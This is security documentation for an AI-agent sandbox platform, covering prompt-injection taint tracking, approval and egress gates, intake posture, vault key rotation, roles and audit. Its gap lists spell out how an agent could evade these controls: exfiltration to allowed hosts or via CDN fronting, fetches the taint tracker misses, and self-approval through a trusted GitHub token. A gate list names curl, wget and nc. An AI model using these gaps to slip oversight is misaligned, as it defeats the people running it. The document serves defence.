- **Secrets the sandbox already holds.** The model credential is still injected. Redaction masks stored values and a few common encodings of them in results, artifacts and logs, but not every transformation ([redaction](#redaction)). A grant the agent copies out works from anywhere that reaches the gateway until its sandbox stops.
- **Secrets a scan doesn't recognize.** Pushes through the gateway are scanned, the agent's own included, but a secret encoded in a way the patterns don't know (or split, compressed, inside a binary file) gets through, as it does past [redaction](#redaction). A direct-mode sandbox pushing with its own token isn't scanned at all.
- **What else is in the pushed branch.** Review PRs, and keep secrets out of `push`-triggered workflows.
- **Egress.** Sandboxes in `open` environments can reach the public internet, except those of [intake jobs](#intake-posture) under `enforce`, which get at least `allowlist`. In `allowlist` and `none` environments, data can still go *to* an allowed host, in a URL or a body: the harness's own model API with the attacker's key is always allowed, and so are hosts in `allow`, approved hosts, MCP servers and the cloud token exchange. A host on a CDN that doesn't check `Host` against SNI (Fastly, Akamai: [what egress doesn't stop](#what-egress-doesnt-stop)) reaches any other site there. Without the gateway, the `pypi`, `npm` and `go` presets open the registries themselves, which take uploads; the sandbox says so. Which packages a sandbox downloads is a low-bandwidth signal in public download statistics.
- **Predictable custom branch names.** A session with a custom branch outside `hangar/session/` can be pre-created by another sandbox before the session exists, and a session continues an existing branch. (A job's branch is reserved from the moment the job is submitted.)
- **E2B command output.** The E2B SDK buffers a command's whole output before hangar sees it, so on E2B a sandbox can still make one of hangar's commands return a very large output.
- **Idle connections.** The gateway listener has no connection cap (uvicorn's counts idle sockets and would let one sandbox lock out the rest), so many idle connections from one sandbox are bounded only by the process's file limit.

## Taint

Text hangar's caller didn't write is fenced in the prompt as untrusted ([front doors](#front-doors)). That covers what a job *starts* with. An agent also reads untrusted text *while it runs*: an issue comment through the GitHub MCP server, a web page, a search result. A prompt injection in any of these can steer what it does next. So hangar records, per turn, whether the agent has read untrusted content (`src/hangar/taint.py`). The [gates](#taint-gates) below read it.

**What taints a turn.** Each source is recorded with its kind, the event that read it (`seq`, its position in the session's [event log](api/traces.md#ids); 0 for what the turn started with) and a reference:

| Kind | When | Reference |
| --- | --- | --- |
| `context` | The turn starts with an untrusted context item (issue text from an untrusted author or any Jira issue, Slack thread context, CI logs and review comments in an auto-fix round), or its job's task was written by someone untrusted (`untrusted_source`) | the item, e.g. `issue text jira-ABC-12.md` |
| `web` | A tool call of kind `web` ([normalized kinds](api/traces.md#normalized-tool-kinds): WebFetch, WebSearch, Codex's `web_search`, Antigravity's `read_url_content`); a shell command that runs `curl` or `wget` on a host other than the sandbox itself | the host, or the tool's name |
| `mcp` | A call to a tool of an MCP server whose `trust` is `untrusted` ([environments](environments.md#mcp-servers-and-trust)): by default every remote (`url`) server, the built-in browser, and any server hangar didn't configure | the server |
| `file` | A `Read` of a file hangar wrote from an untrusted context item | the file's name |

**Sticky.** A session's taint is set by its first tainted turn and never cleared: every later turn starts tainted (`"inherited": true`), a fork carries its parent's, and a job mirrors its sessions (best-of-N attempts and the judge included). A job whose own input is untrusted is tainted when it is submitted. A turn keeps at most 20 sources.

**Where it shows.** `taint` on turns, sessions and jobs in `get_job` / `get_session` and `GET /api/jobs/{id}`, `GET /api/sessions/{name}`: `{"tainted": true, "first_turn": 1, "first_seq": 41, "sources": [{"kind": "web", "seq": 41, "ref": "example.com", "turn": 1}]}`. The first source adds a `taint: read untrusted content from <ref>` event to the session's and job's event stream and the job's timeline; the trace export carries `hangar.taint` and `hangar.taint.first_seq` on each turn ([traces](api/traces.md#turn)); and the PR's review packet says `Untrusted content read: issue text jira-ABC-12.md (context), web: example.com (seq 41)`.

### Taint gates

Once untrusted content has been read, nothing leaves the sandbox on the agent's word alone (#130):

| Sink | Gate | Untainted |
| --- | --- | --- |
| **The PR** ([jobs.md](jobs.md#tainted-jobs)) | Opened as a draft whatever `deliver` says (`pr` becomes `draft_pr`), labelled `hangar:tainted`. `deliver: branch` stays limited to `refs/heads/hangar/**`; job sandboxes still only fetch and hangar pushes after its checks | as before |
| **Landing** ([landing.md](landing.md#tainted-prs)) | The approving reviewer must not be the job's own person or its requester, through their linked GitHub account: `approvals.can_decide(kind="land")`, the same self-approval rule as every other approval (`HANGAR_SELF_APPROVAL=allow_solo` included). The review packet says so | the job's own person may approve |
| **Egress requests** | Approving a host for a tainted session or job goes through `approvals.can_decide(kind="egress")`: an admin, or a repo policy approver, never the work's own person. The refusal says who can. Denying is still the owner's | the owner or an admin |
| **In-turn approvals** ([steering.md](steering.md#taint)) | Under `ask` and `deny-risky`: any `git push`, `gh pr create`, `curl`/`wget`/`nc` to a host (not the sandbox itself) and the environment's MCP write tools (`mcp.<name>.write_tools`) are risky. `deny-risky` denies them "after reading untrusted content"; `ask` asks a person and says why | as before |

Under `approvals: auto` the turn has no approvals to gate: use `deny-risky` for intake jobs (Jira, GitHub issues from outsiders), which are tainted from turn 1. Their PRs are drafts that need a second person to land: that is the intent, the PR is the gate.

The driver learns of the taint at the turn's start (`--tainted`) and, mid-turn, from hangar's signed `taint` command (sent like a steer, the moment the event watcher sees the first untrusted read) or from a web tool call it sees in the harness's own stream. There is no command to clear it, and an unsigned one is refused, so the agent can't untaint itself. Every gate decision is audited as `taint.gate` (`sink`: `pr.open`, `land`, `egress`, `git.push`, `mcp.write`; `decision`; who).

**Gaps.** Taint is read from each harness's stream through the same tool-name table as the trace export. A tool hangar doesn't know is `other` and doesn't taint: a pi extension or a custom tool that fetches pages goes unnoticed, as does a shell command that fetches with anything but `curl`/`wget` (`python -c 'urllib…'`, `git clone` of another repo, `gh api`). Subagents' calls (Claude Code's `Task`) are in the stream and counted. Reading a file the agent itself downloaded earlier is tainted only through the download. Taint is a record for gates and reviewers, not a sandbox.

## The agent's screen and its requests

- **Screens** ([computer-use.md](computer-use.md)): VNC listens on 127.0.0.1 inside the sandbox and is reached only
  through hangar, over the provider's own exec stream; no port is exposed. Tickets are single-use, last 60 seconds,
  are minted only for the work's owner or an admin, and are stored hashed. Watching is view-only unless the ticket
  asked for control, and hangar enforces that by dropping the viewer's input messages itself. Every ticket, view
  (with the client address), takeover and disconnect is audited. A ticket is a bearer for its 60 seconds: whoever
  opens it first gets the screen.
- **Inside a sandbox, VNC and the X display have no access control.** Any process there (and, on Kubernetes, the
  pod's sidecars) can watch and drive the screen. They are the agent's own processes, so this is accepted.
- **Chromium runs without its own sandbox** on every runtime (it can't start under gVisor). A page that exploits
  Chromium gets the sandbox user and everything the agent has (workspace, injected credentials, allowed egress).
  Under gVisor, gVisor is what keeps it off the node; under runc or Docker only the container does. Limit the reach
  with an egress allowlist and short-lived, narrowly scoped credentials; don't browse untrusted sites under runc.
- **Media in PR bodies** is listed by name by default and fetched through hangar, signed in and owner-scoped.
  `HANGAR_PR_MEDIA_LINKS=signed` embeds it through signed links (HMAC with a key derived from the vault key) that
  name one artifact and expire (`HANGAR_PR_MEDIA_LINK_DAYS`). Such a link is its own credential: anyone who reads
  the PR and can reach hangar opens it. Use it only where every PR reader may see the work; turning it off revokes
  them all.
- **Requests** (`hangar-agent env request`) carry a variable name or a host and a redacted reason, never a value.
  They are never granted automatically: only the owner or an admin decides, once, and every decision is audited.
  A request file can't set its own state, and an agent can't flood its owner (5 new a turn, 5 waiting per
  session, 30 an hour per owner, no re-asking a denied target).
- **What a sandbox learns about itself** (`~/.hangar/envstatus.json`, the `hangar-env` MCP server) is names,
  versions, health checks and the egress policy, never a secret value; messages in it are redacted like logs.

## The vault key

One key ring encrypts what hangar keeps secret at rest: the vault (stored credentials), every checkpoint and artifact in the session store, every database backup, and a few rows in the database (live turns' control keys, E2B sandboxes' envVars). Tokens hangar derives per sandbox or per link come from it too: envd's, the egress proxy's credential, preview tickets and sessions, E2B access tokens, signed media links and process tags. `HANGAR_SECRET_KEY` (or `<data dir>/secret.key` when it isn't set) holds the keys, **newest first**, separated by commas (lines, in the file). The newest encrypts and signs; every key hangar hasn't retired decrypts and checks ([`MultiFernet`](https://cryptography.io/en/latest/fernet/#cryptography.fernet.MultiFernet)).

### Where the keys live

- **Secret Manager is where the operator keeps them** (one secret, say `hangar-vault-key`, one version per change): versioned, access-logged, and outside the cluster, so it survives losing it. The `hangar` Kubernetes Secret holds a copy for the pod.
- **Never in a file on a laptop.** The commands below pipe a key from one service to the other; nothing is written to disk. A backup can't be restored without the key it was made with, which is why the key must live outside the cluster, and why it belongs in Secret Manager rather than in someone's home directory.
- If it is only in the Kubernetes Secret today (what `up.sh` does), copy it to Secret Manager once:
  ```bash
  kubectl -n hangar get secret hangar -o jsonpath='{.data.HANGAR_SECRET_KEY}' | base64 -d | \
    gcloud secrets create hangar-vault-key --data-file=- --replication-policy=automatic
  ```
- Give the secret's `secretAccessor` role to the operators who rotate keys, and nobody else: whoever reads it reads every checkpoint and backup they can also fetch.

### Rotating the vault key

Rotate on a schedule, when an operator who could read the key leaves, and at once when the key may have leaked. A rotation:

1. **Put a new key first.** In Secret Manager, as a new version holding `<new>,<old>`, then in the `hangar` Secret, then restart:
   ```bash
   NEW=$(openssl rand -base64 32 | tr '+/' '-_')       # a Fernet key: 32 random bytes, url-safe base64
   { printf '%s,' "$NEW"; gcloud secrets versions access latest --secret=hangar-vault-key; } | \
     gcloud secrets versions add hangar-vault-key --data-file=-
   unset NEW
   kubectl -n hangar patch secret hangar --type merge -p "{\"stringData\":{\"HANGAR_SECRET_KEY\":\"$(
     gcloud secrets versions access latest --secret=hangar-vault-key)\"}}"
   kubectl -n hangar rollout restart deploy/hangar
   ```
   From that start, hangar encrypts with the new key and records the rotation as pending. With a key file (no `HANGAR_SECRET_KEY`, a laptop or a single VM), skip this step: the next one writes the new key first in the file.
2. **`hangar admin rotate-key`.** It re-seals the vault and the database's other sealed rows at once (one transaction), and starts a background pass over the session store: every `.enc` object (checkpoint parts, artifacts, backups) the old key sealed is re-encrypted, keeping Fernet's timestamp. Meanwhile, a checkpoint part copied into a new checkpoint is re-encrypted as it's copied rather than carried forward under the old key. The pass records where it is in the database, so after a restart (a deploy, a crash) it carries on from there. `hangar admin rotate-key --status` (or `GET /api/admin/rotate-key`) shows the progress, and `hangar doctor` the phase.
3. **The old key is retired by itself** when the pass is done and no sandbox started before the rotation is still running. Those sandboxes hold tokens of the old key (envd's, the egress proxy's), and they keep working until then. A long-lived one holds retirement back; `hangar admin rotate-key --retire --force` retires anyway, after which such a sandbox's envd falls back to exec through the provider and a proxied one loses the egress proxy (restart its session). Retired, the old key reads nothing: hangar stops using it even while it is still configured. A key file keeps it in `secret.key.retired` instead: hangar doesn't read with it, but a backup made before the rotation needs it (below). Before retiring, the pass waits while the old key isn't configured (`hangar doctor` shows the error): without it, what it sealed can't be re-encrypted.
4. **Remove the old key from the configuration**: a new Secret Manager version with only the new key, the Secret patched as in step 1, a restart. `hangar doctor` warns until then. **Disable** the old versions (`gcloud secrets versions disable`), don't destroy them, until every backup made before the rotation has aged out (`HANGAR_BACKUP_KEEP`, or the backup bucket's lifecycle rule). The pass re-encrypts a backup it can read, but the database inside it still holds the vault sealed with the old key, and a backup in a bucket hangar may only write to (below) isn't re-encrypted at all. Then take a backup (`hangar admin backup`): it is the first that needs only the new key.

**Restoring a backup made before a rotation**: put the old key back in `HANGAR_SECRET_KEY` after the new one (`<new>,<old>`), restore, and restart. The restored database doesn't know the old key was retired, so hangar reads with it and reports a pending rotation: run `hangar admin rotate-key` again. With a key file, nothing to do: hangar reads `secret.key.retired` too, and `hangar admin restore --local` uses it.

Hangar keeps only key fingerprints (`key_id`: a hash of the key) in its database and status output. Previews' 12-hour sessions, signed media links and E2B access tokens made with the old key stop working when it is retired; opening the preview link again, or `connect` for an E2B client, gets new ones.

### Backups and the vault key

Backups go into the session store (`_backups/` in the checkpoints' bucket) unless `HANGAR_BACKUP_STORE` names another place. Next to the checkpoints, under hangar's own service account, whoever can read that bucket with that account's token reads every checkpoint and every backup, and every backup holds the vault, all under one key. `hangar doctor` warns about that (`backup isolation`). What it wants instead: a bucket of its own where hangar's service account has only `roles/storage.objectCreator` (it can write backups, not read or delete them), a lifecycle rule that deletes them after the time you keep them, and restores done by an operator, with `hangar admin restore --local` and their own access. Hangar then skips pruning (the lifecycle rule keeps the count), its doctor says it can't see the newest backup's age, and a key rotation can't re-encrypt those backups: they keep the key they were made with until they age out, so keep that key's disabled version in Secret Manager until then (as for every backup made before a rotation, above).

## People

One hangar serves a team: run one per team rather than splitting one between teams. Every token belongs to a person, and a person is an **admin** or a **member**.

| | Admin | Member |
| --- | --- | --- |
| Sandboxes, sessions, jobs, snapshots, schedules | everyone's | their own; anyone else's answers "not found", by id or by name |
| Environments | create and change any | create new ones and change their own; `secrets`, `image`, `base`, `runtime_class` and `credential_mode: direct` need an admin |
| Credentials | all; add team credentials (`hangar cred add --team`), assign one to a person (`hangar cred owner`) | the team credentials and their own (`hangar cred add` stores it as theirs) |
| Tokens | mint for anyone, within that person's role | their own: `user` (their login), `mcp` (what `hangar connect` mints), `jobs` |
| REST | everything | `/api/me`, `/api/connect`, their tokens and credentials; jobs through a `jobs` token |

- **A person's own credential** (their API key, or their Claude or Codex login for interactive use) goes only into their sandboxes. A sandbox for someone who has their own credential for its harness uses it in place of the team's; anyone else gets the team's. Naming another person's credential is refused. A repo's policy can require one or the other (`credentials: person | team | person_then_team`).
- **Team credentials** are added by an admin on purpose (`hangar cred add --team`); an admin's credential without `--team` is their own. Jobs no person owns use them: webhooks, schedules without a person, and GitHub and Slack senders linked to nobody. They are API keys, or other credentials the vendor's terms allow for automation: a subscription login (Claude Pro or Max, ChatGPT) is refused as a team credential, since the vendors' terms make it one person's and Claude Code's forbid routing requests through a Pro or Max login on behalf of others ([team.md](team.md#what-the-vendors-allow)).
- **Ownership is recorded** as `person` on sandboxes, snapshots, sessions, jobs and schedules. A job's session and sandbox, a fork and a best-of-N attempt are their source's person's. Work from a GitHub, Slack or Jira account an admin linked to a person (`hangar person link`, by ids that don't change hands: a GitHub user id, a Slack workspace and user id, a Jira account id) is that person's: their caps, their budget, their lists. A linked account acts as its person, so it is trusted at every front door, and only it continues that person's jobs there ([team.md](team.md#who-is-trusted)). Work from anyone linked to nobody, and from inbound webhooks, has no person, so only admins see it; the front door's own rule decides whether it waits for approval.
- **Existing installs keep working, and the owner's logins stay the owner's.** Tokens minted before people, the server's admin token and the bootstrap token belong to `owner`, an admin. Records made before have no person, so they are the admins'. Credentials stored before people become the owner's own on the first start, once (`hangar cred migration` shows which), so your Claude or Codex login never reaches a member's sandbox or a job no person owns; control-plane ones stay the control plane's. Add team credentials for everyone else ([team.md](team.md)).
- **Removing someone** revokes their tokens (OAuth grants they approved stop with them). Their work stays, visible to admins; their own credentials go into nobody's sandbox until an admin reassigns them. Demoting an admin drops the `admin` scope from their tokens at once.
- **Visibility is enforced at the front doors** (MCP tools and resources, REST), by the record each tool call names, so a new MCP tool with a `sandbox`, `session`, `job`, `ref`, `source` or `schedule` argument is covered without a change.
- **Listings filter in the database.** `list_jobs`, `list_sessions`, the recent-work resources and `GET /api/jobs` ask the database for the caller's person's records (a member) or everyone's (an admin), then page through them with a cursor. A cursor is a position (a timestamp and a record id), not a credential: a member who passes a cursor made from someone else's record still gets only their own records after it. Archived jobs and sessions keep their `person` and are listed and found by the same rules.

## OAuth connectors

- **Scope:** OAuth access tokens reach `/mcp` only, never the REST API or the dashboard.
- **Lifetime:** every approval is tied to the hangar token that approved it and stops working when that token is revoked or the app is disconnected. Approvals last at most 90 days.
- **Registration:** limited to allowlisted redirect hosts (`HANGAR_OAUTH_REDIRECT_HOSTS`; an empty list allows none, `"*"` any) and capped in number. Redirect URIs must be `https`, `http` to `localhost`, `127.0.0.1` or `[::1]`, or a native app's own scheme (RFC 8252). A host entry (`claude.ai`) covers `https` and its subdomains; a native app's scheme needs an exact `scheme://host` entry, so listing `claude.ai` doesn't let an app register `evil://claude.ai`. RFC 8252 §7.1's reverse-domain form, which has no host (`com.example.app:/oauth2redirect`), needs an exact `scheme:` entry (`com.example.app:`). The consent page names the scheme of a non-web redirect (`cursor://anysphere.cursor-mcp`). Schemes a browser handles itself (`javascript:`, `data:`, `file:` and the like) are never allowed. A client that asks for several redirect URIs is registered with the allowed ones (RFC 7591 §3.2.1); it is refused only when none is allowed.
- **Cursor:** `cursor://anysphere.cursor-mcp` is in the default list. Any app on the user's machine can claim a custom scheme, just as any app there can listen on the loopback ports native clients use (also allowed by default), so the scheme adds no new exposure: the code goes to an app on the machine of the person who approved, PKCE (`S256`) binds it to the client that started the flow, and approving needs a hangar login token. Cursor also asks for `https://www.cursor.com/agents/mcp/oauth/callback`; that sends the code to Cursor's servers, so it is left out unless you list `www.cursor.com`.
- **Audience:** a client may ask for a token only for hangar's own MCP endpoint (`resource` = `HANGAR_PUBLIC_URL` or `…/mcp`, RFC 8707); any other resource is refused at `/authorize`.
- **PKCE:** `S256` is required, and the code is bound to its redirect URI (the MCP SDK's token endpoint checks both).
- **Consent page:** needs an admin token or a person's login (`user`) token, can't be framed, and isn't cached. The grant acts as that token: a member's connector sees their own work.

## Front doors

Work enters hangar through REST, MCP, A2A, GitHub webhooks, Slack, signed inbound webhooks and schedules. Each one decides who may start work, and every one of them ends in the same job service, which applies the limits below.

| Front door | Who can start or steer work | Fence |
| --- | --- | --- |
| REST, A2A | An admin token: anything. A `jobs` token: its own jobs only (another token's job id or A2A `contextId`/`taskId` is "not found") | `jobs` tokens: repos in `HANGAR_GITHUB_REPOS` and their environments, no provider choice, their `max_budget` |
| MCP | Admin tokens, and people's `user` and `mcp` tokens; an OAuth grant acts as the token that approved it | A member's tokens reach only their own work ([People](#people)); `mcp` tokens can't set `secrets`, `image`, `base`, `runtime_class` or `credential_mode: direct` on an environment, call admin-only tools, or approve jobs |
| GitHub | Linked accounts and trusted people ([triggers.md](triggers.md#1-who-can-start-work-from-github)); anyone else's trigger waits for approval, and their comments can't continue a job or answer its question. A person's job is continued only by that person's linked account | mapped repos, their environments |
| Slack | Linked accounts; members of your workspace in a mapped channel (or `HANGAR_SLACK_USERS`); Slack Connect guests from other organizations only when listed. A person's job is continued only by them | like a `jobs` token |
| Inbound webhooks | Whoever holds the source's HMAC key | the source's configured repo and environment |
| Schedules | Admin tokens create them | the template, validated at creation |

Text that hangar's caller didn't write is fenced in the prompt as untrusted: issue bodies and comments by untrusted authors, an untrusted person's `/hangar` request, Slack thread context, and everything from an inbound webhook ([triggers.md](triggers.md#untrusted-text-in-the-prompt)).

**Agents in `credential_mode: direct` can reach the GitHub front door.** Without the [git gateway](#git-credential-gateway), a sandbox holds a GitHub token. The account behind it has write access to the repo, so by default (author association) its comments are trusted. An agent can then comment `/hangar approve` on an outsider's job, start new jobs, or continue another job's PR as that account. Use the gateway for GitHub-triggered work, or set `HANGAR_GITHUB_TRUSTED` and leave that account out.

### Intake posture

Text from a ticket, an issue, a Slack thread or a webhook is fenced in the prompt, but a prompt is not a boundary: with open egress and a GitHub token in reach, an injected prompt has a way out and the means to push. `HANGAR_INTAKE_POSTURE` (`posture.py`) makes two boundaries real for every **intake job**: one whose `source` is `github`, `github-projects`, `jira`, `slack` or `webhook`, one with an untrusted author (`untrusted_source`), or one with an untrusted context item. That covers [PR auto-fix](jobs.md#pr-auto-fix) rounds (CI output and review comments are untrusted context; the job becomes an intake job from that turn on) and [agent-led environment setup](environments.md) started from an issue (its child jobs and validation sandbox inherit the labels). A person's own submission over MCP, REST or the CLI is not an intake job.

| `HANGAR_INTAKE_POSTURE` | Git | Egress |
| --- | --- | --- |
| `enforce` (the default) | the [git gateway](#git-credential-gateway) must serve the repo's host; otherwise `submit` refuses the job with a message naming `HANGAR_GATEWAY_URL`, which the front door posts to the issue, ticket or thread | at least `allowlist`, even in an `open` environment |
| `warn` (the one-release transition, [upgrading.md](upgrading.md)) | runs without it | runs as the environment says |
| `off` | as before | as before |

Under `warn` a job that `enforce` would have changed gets a `posture.warn: …` job event, a `posture.warn` audit entry and an *Intake posture (warn)* line in its [review packet](landing.md).

**The egress floor.** An enforced intake job carries the label `hangar.egress.floor: allowlist`; its session and every sandbox it starts (best-of-N attempts, follow-ups, resumes) carry it too. `egress.resolve` raises the environment's mode to the floor, so the sandbox goes on the proxy-only network (the internal `hangar-egress` network on Docker, the proxied NetworkPolicy and a SandboxTemplate of its own on GKE) and gets the environment's presets and `allow`, the repo policy's hosts, and the harness's API hosts. A repo policy can still tighten it to `none`, never loosen it. A sandbox `info.egress` (and its [manifest](api/manifest.schema.json)'s `egress`) records `floor: allowlist` and `floor_reason: intake`; the review packet says `Egress: allowlist (intake floor)`. A sandbox started before the job became an intake job (an auto-fix round on a person's job), or one parked for hot resume, is checkpointed and replaced before the turn runs.

**Warm pools.** A warm sandbox of an `open` environment is on the open network, so it is never claimed for an intake job: the job cold-starts, 30–60 s more. Where that matters, declare a proxied pool: an environment with `egress: {mode: allowlist}` and `warm_pool:` for intake work (map it in `HANGAR_GITHUB_REPOS`), whose warm sandboxes are proxied already. Hosts outside the allowlist go through [egress requests](#egress-allowlists), answered by a person.

**Where it can't run.** The floor needs hangar's egress proxy: `HANGAR_EGRESS_URL` on GKE, hangar on the Linux Docker host itself (not inside Docker Desktop's VM, and not in the Compose container) on Docker. Elsewhere an enforced intake job in an `open` environment fails to start with a message that says so, rather than run unfenced; use `warn` for local work. `hangar doctor` reports the posture, the gateway, the egress proxy per provider, and each environment mapped for intake work with its effective mode. A job queued while the pools are powered down gets the floor when it claims its sandbox.

### Signed requests

- GitHub (`X-Hub-Signature-256`), Slack (`v0`) and inbound webhooks (per-source HMAC) are verified over the raw body, before anything parses it, and compared in constant time (as bytes, so a malformed header is a 401, not an error).
- **Replays.** A signed request is identified by what its signature covers, and remembered in the store, so a restart doesn't forget it. GitHub deliveries and inbound webhook deliveries are kept for `HANGAR_WEBHOOK_REPLAY_HOURS` (7 days); a replay with a fresh, unsigned delivery id or timestamp header is still a duplicate and does nothing. Slack events are deduplicated by `event_id`, and slash commands by signature within Slack's five-minute window.
- A missing secret is reported as "not stored" without naming the credential.
- **Jira** signs its admin webhook (`X-Hub-Signature`); use it for issue events. Its Automation rules can't sign, so hangar accepts a hidden `X-Hangar-Token` as a fallback. That token only proves who holds it, so an Automation request starts a job only when the issue's own history shows the trigger transition within the last 10 minutes, at most 3 times per issue a day, and only as a `hangar:automation` request. A stale transition, a wrong event or a wrong token alerts the admins (inbox, and a Slack DM), and `hangar doctor` warns on a token older than 90 days and on Automation in use without signed issue events. Rotate it with `hangar cred add <name> --rotate` ([intake.md](intake.md#fallback-an-automation-rule)).

### Outbound webhooks (SSRF)

Job callbacks and A2A push notifications go only to public `https` hosts unless the host is in `HANGAR_JOB_CALLBACK_HOSTS`. Just before each send, the name is resolved, every address is checked, and the connection is made to the checked address itself (TLS still verifies the name). A name that re-resolves to `127.0.0.1` or a metadata address between the check and the connection (DNS rebinding) reaches nothing. Redirects aren't followed, and proxy environment variables are ignored for these requests.

### Scopes

Every MCP tool and resource and every REST route is listed, by verb, with the token scope it requires and its owner rule, in [`tests/fixtures/scope_matrix.yaml`](../tests/fixtures/scope_matrix.yaml). `tests/test_scope_parity.py` checks that list against the code on every change to a route or tool module: a tool's scope comes from how `mcp_server.tool()` registered it, and a route's from its FastAPI dependency. A new tool or route fails CI until it has an entry, and the failure prints one to paste. Where one verb's MCP and REST twins differ, the entry has to say why (`exception:`). Every privileged verb whose twins agree (approving and rejecting jobs, `hangar://status`) is also called on both surfaces, as a member, as an admin's `mcp`-only token and as an admin login, and must answer the same way. In short:

| Surface | Scope | Owner rule |
| --- | --- | --- |
| MCP tools and resources | any token `/mcp` accepts (admin, `mcp`, `user`, OAuth grants) | own records unless admin (`people.Guard`); `approve_job` / `reject_job` follow [who may approve](triggers.md#who-may-approve); `hangar://status` is admin-only |
| REST `/api/jobs*`, experiments, manifests | admin, or a `jobs` service token | a `jobs` token's own jobs |
| REST approve / reject | [who may approve](triggers.md#who-may-approve) | as MCP |
| REST `/api/me`, tokens, credentials, inbox, env requests, envbuilds, records | admin, or a person's `user` login | own records unless admin |
| The rest of REST | admin | everything |
| Webhooks, `/e2b`, the gateway's `/git`, `/pkg`, `/cache`, `/registry` | their own credentials (signatures, `sandboxes` tokens, sandbox grants) | the source's or the sandbox's own |

### Front-door limits

| Limit | Default | Applies to |
| --- | --- | --- |
| `HANGAR_JOB_RATE_PER_MINUTE`, `HANGAR_JOB_RATE_BURST` | 30, 10 | Job submissions and follow-ups per caller: a `jobs` token, a GitHub user, a Slack user, a webhook source. A token bucket: `BURST` at once, refilling at `PER_MINUTE`. |
| `HANGAR_JOB_SOURCE_RATE_PER_MINUTE`, `HANGAR_JOB_SOURCE_RATE_BURST` | 120, 60 | The same per front door (`github`, `slack`, `webhook`, `a2a`, `api`), across all its callers. Submissions that wait for approval (untrusted GitHub people) have a bucket of their own per front door, so outsiders can't use up the one trusted people need. |
| `HANGAR_JOB_MAX_ACTIVE_PER_OWNER` | 10 | Unfinished jobs per caller, counting those waiting for approval or input |
| `HANGAR_A2A_MAX_STREAMS_PER_OWNER` | 20 | Open A2A streams and blocking sends per token |
| `HANGAR_MAX_REQUEST_MB` | 100 | Request bodies from a token on a route it may use: an `admin` token anywhere on `/api` and `/mcp`, a `jobs` token on `/api/jobs*`, an `mcp` token (or an OAuth token) on `/mcp` (jobs can carry git bundles); `/a2a` uses `HANGAR_A2A_MAX_REQUEST_BYTES` for `admin` and `jobs` tokens |
| | 64 KB | Request bodies without a valid token on `/api`, `/mcp` and `/a2a` (they get a 401 anyway), from a token on a route its scope doesn't reach (it gets a 403 anyway), and the OAuth endpoints |
| | 2 MB, 1 MB | `/api/hooks/github`, `/api/hooks/slack/*`; inbound webhooks keep their own setting. GitHub sends up to 25 MB, but the events hangar acts on (`issues`, `issue_comment`) carry bodies of at most 65,536 characters; a bigger delivery of another event gets a 413, which changes nothing since hangar would ignore it |

Admin tokens and schedules aren't rate limited or capped: an admin token can run anything already. Set a rate to 0 to turn it off. REST answers a rate-limited request with `429` and `Retry-After`; other front doors say so in their own way (a JSON-RPC error, a message in the Slack thread, a 429 to the webhook sender). Buckets live in memory, so a restart refills them.

Bodies are capped before the route runs, because FastAPI parses a JSON body before it checks the token.

### Audit

Every approval decision (`job.approve`, `job.reject`, `job.approval_expired`, `job.approve.refused`, `job.reject.refused`) and every refused request is in the audit log (`GET /api/audit`, the dashboard's audit view). One rule decides approvals on every path, MCP, REST, GitHub and Jira: an admin or a repo policy approver, with a login token over MCP and REST, never on their own job ([who may approve](triggers.md#who-may-approve)). Each decision records the deciding person, whether it was a self-approval (`HANGAR_SELF_APPROVAL=allow_solo`) and the rule that allowed it:

- `request.rejected`: any 401, 403, 413 or 429 answer, with the client address, method and path;
- `job.refused`: a submission or follow-up that was refused, with why (`rate_limited`, `too_many_active`, `invalid`, which covers a token's fence) and the caller;
- `hook.replay`: a duplicate signed delivery;
- `github.refused`: an untrusted person's attempt to continue a job or answer its question;
- `hook.automation.stale_transition`, `hook.automation.capped`, `hook.automation.wrong_event` and `jira.alert`: Jira Automation requests refused, and the alerts they raised ([intake.md](intake.md#fallback-an-automation-rule)).

Refusals are themselves limited to `HANGAR_AUDIT_REJECTIONS_PER_MINUTE` (30) per client address or caller, so a flood can't fill the audit log; the next entry that gets through records how many were dropped (`suppressed_before`).

## Operational advice

- Keep the control plane private: localhost, an IAP tunnel, Tailscale, or IAP on the GKE ingress.
- Use a separate token per client so you can revoke one without affecting the rest. The audit log records which token did what. `hangar connect` does this for you: each client on each machine gets its own token with the `mcp` scope, which works at `/mcp` and nowhere else. A leaked client config can then drive sandboxes, but it can't call the REST API to read or change the vault, settings or tokens, or approve OAuth apps, and it can't map vault secrets into an environment. Sandboxes it starts can still use the stored credentials meant for sandboxes (never the control plane's own), so revoke a leaked token at once (`hangar token revoke`).
- Give E2B SDK clients tokens with the `sandboxes` scope, which work only on the [E2B-compatible API](e2b.md) and its sandbox URLs, for the sandboxes the token created. Their sandboxes get no stored credentials unless the environment is in `HANGAR_E2B_TRUSTED_ENVIRONMENTS`.
- Settings stored with `hangar config` can't hold secrets: hangar refuses the admin token, the vault key and provider keys there. Settings that point at secrets name a vault credential instead.
- Set `HANGAR_SECRET_KEY` explicitly in clusters, from Secret Manager or a Kubernetes Secret, so the vault survives pod restarts. Keep the key in Secret Manager, never in a file on a laptop, and [rotate it](#rotating-the-vault-key).
